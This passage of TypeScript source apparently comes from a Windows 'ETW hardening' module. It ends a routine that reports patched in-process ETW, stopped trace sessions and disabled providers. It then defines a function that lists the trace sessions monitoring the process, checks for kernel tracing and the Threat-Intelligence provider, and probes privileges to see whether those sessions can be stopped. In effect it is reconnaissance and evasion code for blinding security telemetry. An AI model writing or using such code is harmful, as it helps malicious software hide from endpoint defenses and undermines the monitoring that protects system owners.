      ...providerDisables.filter((p) => p.privilegeMissing),
    ];
    if (privilegeFailures.length > 0) {
      logger.debug(
        `ETW hardening: kernel-level ops require SYSTEM privilege (${privilegeFailures.length} attempts blocked)`,
      );
    }
  }

  return { inProcessPatched, sessionStops, providerDisables, anySuccess, limitations };
}

/**
 * Get a summary of ETW trace sessions that are monitoring the current process.
 *
 * Combines logman-based enumeration with NtTraceControl-based query to provide
 * a comprehensive view of active ETW monitoring. Returns which providers are
 * actively consuming events and whether they are kernel-level (higher risk).
 */
export function getEtwMonitoringSummary(): {
  activeSessions: number;
  kernelTraceActive: boolean;
  threatIntelActive: boolean;
  monitoredProviders: string[];
  privilegeAvailable: boolean;
  canStopSessions: boolean;
} {
  const result = enumerateActiveTraceSessions();
  const kernelTraceActive = result.sessions.some((s) => s.isKernelTrace);
  const threatIntelActive = result.monitoringProviders.some((p) =>
    p.toLowerCase().includes('threat-intelligence'),
  );

  // Check if we can stop sessions (admin check)
  let privilegeAvailable = false;
  if (process.platform === 'win32') {
    try {
      const { execSync } = require('node:child_process');
      // Absolute path: on hosts with MSYS/Git-Bash on PATH, a bare `whoami`
      // resolves to /usr/bin/whoami, which rejects the `/priv` flag ("extra
      // operand") and the probe silently reads as non-admin. SystemRoot
      // fallback mirrors SyscallResolver's ntdll resolution.
      const systemRoot = process.env.SystemRoot || process.env.WINDIR || 'C:\\Windows';
      const whoami = execSync(`"${systemRoot}\\System32\\whoami.exe" /priv`, {
        timeout: 5000,
        encoding: 'utf8',
        windowsHide: true,
      }) as string;
      privilegeAvailable =
        whoami.includes('SeSystemProfilePrivilege') && whoami.includes('Enabled');
    } catch {
      // Non-admin — privilege not available
    }
  }

  return {
    activeSessions: result.sessions.length,
    kernelTraceActive,
    threatIntelActive,
    monitoredProviders: result.monitoringProviders,
    privilegeAvailable,
    canStopSessions: privilegeAvailable && kernelTraceActive,
  };
}
